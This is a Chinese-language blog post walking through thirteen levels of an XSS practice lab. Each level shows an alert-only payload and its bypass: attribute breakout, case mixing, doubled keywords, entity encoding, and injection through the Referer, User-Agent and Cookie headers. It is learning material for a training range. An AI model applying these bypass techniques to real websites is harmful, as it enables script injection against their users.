<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="相关靶场网上一大堆，部署也非常简单，这里就不细说了 Level 1可以看到 url 中有一个 name 参数  将 name&#x3D;test 改为 name&#x3D;admin，发现网页中内容也变了，并且是直接输入输出的，没有任何过滤，由此可知，name 是用户可控的参数  因此直接打 payload 即可 1&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS 靶场通关记录">
<meta property="og:url" content="http://example.com/2021/11/18/xsspractice/index.html">
<meta property="og:site_name" content="Brich">
<meta property="og:description" content="相关靶场网上一大堆，部署也非常简单，这里就不细说了 Level 1可以看到 url 中有一个 name 参数  将 name&#x3D;test 改为 name&#x3D;admin，发现网页中内容也变了，并且是直接输入输出的，没有任何过滤，由此可知，name 是用户可控的参数  因此直接打 payload 即可 1&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231048/Xnip2021-11-18_18-23-47_jgeigs.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231144/Xnip2021-11-18_18-25-34_z7gpex.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231357/Xnip2021-11-18_18-28-53_o0jfjk.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231674/Xnip2021-11-18_18-34-04_bum9ye.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231860/Xnip2021-11-18_18-37-27_mkfcwy.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637232371/Xnip2021-11-18_18-45-54_isf5lj.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637232536/Xnip2021-11-18_18-48-39_ykzbvn.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637232642/Xnip2021-11-18_18-50-07_i3ba41.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637232810/Xnip2021-11-18_18-53-19_uwbqfd.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637232959/Xnip2021-11-18_18-55-46_hconyb.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637233587/Xnip2021-11-18_19-06-14_mhfywh.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637234416/Xnip2021-11-18_19-20-03_fkfp5z.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-03_y5qlh0.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-50_m8gjz1.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638775939/Xnip2021-12-06_15-32-01_s91oej.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-06_grvxpi.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-19_n9yo4d.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638777141/Xnip2021-12-06_15-52-08_vhv5sz.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638778195/Xnip2021-12-06_16-01-36_r5lkvj.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638779166/Xnip2021-12-06_16-25-55_ixypjp.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-41_kw6nzr.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-52_jfbylx.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638782679/Xnip2021-12-06_17-18-55_uvkxz6.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638782678/Xnip2021-12-06_17-20-27_jjg42p.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638782775/Xnip2021-12-06_17-26-00_z0oxeu.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638782952/Xnip2021-12-06_17-28-56_mw25dn.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638837334/Xnip2021-12-07_08-35-00_pfev2k.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638837566/Xnip2021-12-07_08-37-49_nfagn0.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638837689/Xnip2021-12-07_08-40-57_rhk8bk.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638837687/Xnip2021-12-07_08-41-07_smnune.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-54-04_wnevpb.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-37_nzg3ny.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-49_o47gjv.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-55-01_uyuwmd.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-57-07_v0bqun.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838793/Xnip2021-12-07_08-59-19_kduxlg.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-59-33_aso8nh.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638839138/Xnip2021-12-07_09-05-25_szaktj.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-40_hygifm.png">
<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-51_yigguv.png">
<meta property="article:published_time" content="2021-11-18T03:35:22.000Z">
<meta property="article:modified_time" content="2022-02-13T03:47:56.604Z">
<meta property="article:author" content="lin">
<meta property="article:tag" content="学习笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1637231048/Xnip2021-11-18_18-23-47_jgeigs.png">
    
    
      
        
          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
        
      
      
        
          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
        
      
    
    <!-- title -->
    <title>XSS 靶场通关记录</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/vlog/">vlog</a></li><!--
     --><!--
       --><li><a href="/friends/">Friends</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/12/08/netlogon/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/11/11/redteam/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/11/18/xsspractice/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/11/18/xsspractice/&text=XSS 靶场通关记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/11/18/xsspractice/&is_video=false&description=XSS 靶场通关记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS 靶场通关记录&body=Check out this article: http://example.com/2021/11/18/xsspractice/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/11/18/xsspractice/&title=XSS 靶场通关记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/11/18/xsspractice/&name=XSS 靶场通关记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/11/18/xsspractice/&t=XSS 靶场通关记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">2.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">3.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">4.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">5.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">6.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">7.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">8.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">9.</span> <span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">10.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11"><span class="toc-number">11.</span> <span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12"><span class="toc-number">12.</span> <span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">13.</span> <span class="toc-text">Level 13</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        XSS 靶场通关记录
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">lin</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-18T03:35:22.000Z" itemprop="datePublished">2021-11-18</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>相关靶场网上一大堆，部署也非常简单，这里就不细说了</p>
<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>可以看到 url 中有一个 name 参数</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231048/Xnip2021-11-18_18-23-47_jgeigs.png"></p>
<p>将 name&#x3D;test 改为 name&#x3D;admin，发现网页中内容也变了，并且是直接输入输出的，没有任何过滤，由此可知，name 是用户可控的参数</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231144/Xnip2021-11-18_18-25-34_z7gpex.png"></p>
<p>因此直接打 payload 即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231357/Xnip2021-11-18_18-28-53_o0jfjk.png"></p>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>可以看到我们的 payload 直接被插入到了 h2 标签，这里输入框的内容是可控的，是个 input 标签</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231674/Xnip2021-11-18_18-34-04_bum9ye.png"></p>
<p>直接闭合 input 标签即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231860/Xnip2021-11-18_18-37-27_mkfcwy.png"></p>
<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>这题和 level2 一样，会将输入的内容直接输出到 h2 标签里</p>
<p>尝试闭合 input 标签但是发现这一关对双引号进行了实体化编码输出</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232371/Xnip2021-11-18_18-45-54_isf5lj.png"></p>
<p>单独输入一个单引号发现 value 属性被闭合了</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232536/Xnip2021-11-18_18-48-39_ykzbvn.png"></p>
<p>那么可以构造 payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后点击一下输入框即可触发 xss</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232642/Xnip2021-11-18_18-50-07_i3ba41.png"></p>
<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>这题还是将输入的内容直接输出到 h2 标签</p>
<p>单独输入一个双引号，发现 value 属性被闭合</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232810/Xnip2021-11-18_18-53-19_uwbqfd.png"></p>
<p>直接构造 payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>点击一下输入框即可触发 xss</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232959/Xnip2021-11-18_18-55-46_hconyb.png"></p>
<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>过滤了 onclick</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637233587/Xnip2021-11-18_19-06-14_mhfywh.png"></p>
<p>尝试引入图片报错方式，发现也被过滤、onfocus 也被过滤了</p>
<p>尝试构造一个 a 标签绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=javascript:alert(/xss/)&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637234416/Xnip2021-11-18_19-20-03_fkfp5z.png"></p>
<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>直接用第五关的 payload 发现 href 被过滤了</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-03_y5qlh0.png"></p>
<p>可以大小写混合绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; ONclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-50_m8gjz1.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775939/Xnip2021-12-06_15-32-01_s91oej.png"></p>
<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>上一关 payload 直接打过去，发现过滤了 onclick 中的 on</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-06_grvxpi.png"></p>
<p>那么直接构造 payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;oonnclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-19_n9yo4d.png"></p>
<p>点击即可弹窗</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777141/Xnip2021-12-06_15-52-08_vhv5sz.png"></p>
<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>一个 a 标签，有 href 属性</p>
<p>构造 payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<p>javascript 被过滤，会被添加一个下划线</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778195/Xnip2021-12-06_16-01-36_r5lkvj.png"></p>
<p>js unicode 编码即可绕过</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638779166/Xnip2021-12-06_16-25-55_ixypjp.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-41_kw6nzr.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-52_jfbylx.png"></p>
<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>也是 a 标签 href 属性</p>
<p>直接输入 javascript:alert (&#x2F;xss&#x2F;) 提示我参数不合法</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782679/Xnip2021-12-06_17-18-55_uvkxz6.png"></p>
<p>构造 payload 加一个 http:&#x2F;&#x2F; 不提示链接不合法了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="attr">http</span>:<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>但是过滤了 javascript</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782678/Xnip2021-12-06_17-20-27_jjg42p.png"></p>
<p>参考第八关，可以 unicode 编码绕过，同时需要注释掉后面的 http:&#x2F;&#x2F;</p>
<p>payload</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782775/Xnip2021-12-06_17-26-00_z0oxeu.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782952/Xnip2021-12-06_17-28-56_mw25dn.png"></p>
<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>输入’’ ‘ &gt;&lt;script onclick 发现过滤了” &lt;&gt;</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837334/Xnip2021-12-07_08-35-00_pfev2k.png"></p>
<p>并且有三个隐藏的文本框，根据他们的 name 构造传值，发现最后一个文本框可以利用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=<span class="string">&quot; type=&#x27;text&#x27;&gt;&amp;t_history=&quot;</span> type=<span class="string">&#x27;text&#x27;</span>&gt;&amp;t_sort=<span class="string">&quot; type=&#x27;text&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837566/Xnip2021-12-07_08-37-49_nfagn0.png"></p>
<p>那么可以构造 payload</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837689/Xnip2021-12-07_08-40-57_rhk8bk.png"></p>
<p>点击文本框即可触发 xss</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837687/Xnip2021-12-07_08-41-07_smnune.png"></p>
<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p>使用第 10 关的测试语句测试，发现过滤了 “&lt;&gt;</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=<span class="string">&quot; type=&#x27;text&#x27;&gt;&amp;t_history=&quot;</span> type=<span class="string">&#x27;text&#x27;</span>&gt;&amp;t_sort=<span class="string">&quot; type=&#x27;text&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-54-04_wnevpb.png"></p>
<p>查看源代码可以发现，变量 $str11 通过 http 头的 Referer 字段获取变量值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br></pre></td></tr></table></figure>

<p>该变量在过滤掉 &lt;&gt; 后放进了和 Level-10 类似的属性为 hidden 的 input 框中，抓包伪造 Referer 的值，原理与 Level-10 类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-37_nzg3ny.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-49_o47gjv.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-55-01_uyuwmd.png"></p>
<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p>查看源代码，发现名为 t_ua 的隐藏文本框，直接抓包修改 ua 值即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-57-07_v0bqun.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838793/Xnip2021-12-07_08-59-19_kduxlg.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-59-33_aso8nh.png"></p>
<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>多了一个 t_cook 的隐藏文本框，根据前几关的经验，想必是 cookie？</p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839138/Xnip2021-12-07_09-05-25_szaktj.png"></p>
<p>bp 抓包修改 cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-40_hygifm.png"></p>
<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-51_yigguv.png"></p>

  </div>
</article>





    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments" class="blog-post-comments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            visitor: true,
            appId: 'Ku71Pva4EFeKIH5y64LCYVwp-gzGzoHsz',
            appKey: 'wqnsWKV8eVHemIwCa9vo9vRg',
            placeholder: '快来评论一下吧',
            avatar: 'robohash'
        })
    </script>

    
    
    

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/vlog/">vlog</a></li>
         
          <li><a href="/friends/">Friends</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">2.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-3"><span class="toc-number">3.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">4.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">5.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">6.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">7.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">8.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">9.</span> <span class="toc-text">Level 